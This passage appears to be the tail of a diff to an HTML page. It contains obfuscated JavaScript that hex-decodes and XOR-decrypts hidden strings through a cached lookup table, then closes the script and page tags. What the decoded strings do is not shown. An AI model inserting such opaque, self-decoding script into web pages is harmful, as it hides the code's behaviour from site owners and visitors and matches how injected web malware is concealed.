Uint8Array(qHLfn['match'](/.{1,2}/g)['map'](JRMexmf=>parseInt(JRMexmf,-0x1*parseInt(-0x12e)+-0xdc1*-0x1+-parseInt(0xedf)))),yzuBpRiFSFq_wPGNK=GQloCGHmGKtLJqIIj$jnKaqx['map'](Wkg_QjyPwvVREelpsnGOnwJG=>Wkg_QjyPwvVREelpsnGOnwJG^zVDPTWpEcic$l),gF$xXW$bUfgmPrkGxHtTR=new TextDecoder(),QpJsUNKKXcaFcrHADyIt=gF$xXW$bUfgmPrkGxHtTR['decode'](yzuBpRiFSFq_wPGNK);return QpJsUNKKXcaFcrHADyIt;};sFfEkK$fMziBAJZwZbkuvp['TWdYOH']=kiHmW,DgkkwGrBFCVM$xjRVLz$VfAbWhV=arguments,sFfEkK$fMziBAJZwZbkuvp['MCMlHP']=!![];}const Xtz$tyRcF_YASGBEJfRTSL=jpcyYzd_r_c[-0x961+0x7be+parseInt(0x1)*parseInt(0x1a3)],aK$Aa_l=cBkxdlJOLrthNdkDJWsPnwlWD+Xtz$tyRcF_YASGBEJfRTSL,XQHXnDh$$EY=DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l];return!XQHXnDh$$EY?(sFfEkK$fMziBAJZwZbkuvp['MbVogc']===undefined&&(sFfEkK$fMziBAJZwZbkuvp['MbVogc']=!![]),ZrC$BmMHQJFnM$qxVDvOaapr=sFfEkK$fMziBAJZwZbkuvp['TWdYOH'](ZrC$BmMHQJFnM$qxVDvOaapr),DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l]=ZrC$BmMHQJFnM$qxVDvOaapr):ZrC$BmMHQJFnM$qxVDvOaapr=XQHXnDh$$EY,ZrC$BmMHQJFnM$qxVDvOaapr;},sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek);}function _0x257e(){const aWI$GMwS=sFfEkK$fMziBAJZwZbkuvp,uudKm=[aWI$GMwS(0x186),aWI$GMwS(0x1a1),aWI$GMwS(0x1a5),aWI$GMwS(0x199),aWI$GMwS(0x1b8),aWI$GMwS(0x19e),aWI$GMwS(0x18a),aWI$GMwS(0x1bf),aWI$GMwS(0x1a0),aWI$GMwS(0x196),aWI$GMwS(0x18d),aWI$GMwS(0x1b0),aWI$GMwS(0x17f),aWI$GMwS(0x18b),aWI$GMwS(0x1bd),aWI$GMwS(0x1b1),aWI$GMwS(0x19b),aWI$GMwS(0x1af),aWI$GMwS(0x197),aWI$GMwS(0x1ae),aWI$GMwS(0x185),aWI$GMwS(0x187),aWI$GMwS(0x1a8),aWI$GMwS(0x19a),aWI$GMwS(0x1b7),aWI$GMwS(0x1bc),aWI$GMwS(0x1a3),aWI$GMwS(0x1a2),aWI$GMwS(0x182),aWI$GMwS(0x192),aWI$GMwS(0x18e),aWI$GMwS(0x181),aWI$GMwS(0x1ab),aWI$GMwS(0x1a4),aWI$GMwS(0x1ba),aWI$GMwS(0x18c),aWI$GMwS(0x1a6),aWI$GMwS(0x19c),aWI$GMwS(0x1b3),aWI$GMwS(0x1aa),aWI$GMwS(0x194),aWI$GMwS(0x1b9),aWI$GMwS(0x1bb),aWI$GMwS(0x188),aWI$GMwS(0x1ad),aWI$GMwS(0x19d),aWI$GMwS(0x198),aWI$GMwS(0x180),aWI$GMwS(0x193)];return _0x257e=function(){return uudKm;},_0x257e();}</script></body>
+
+	</html>
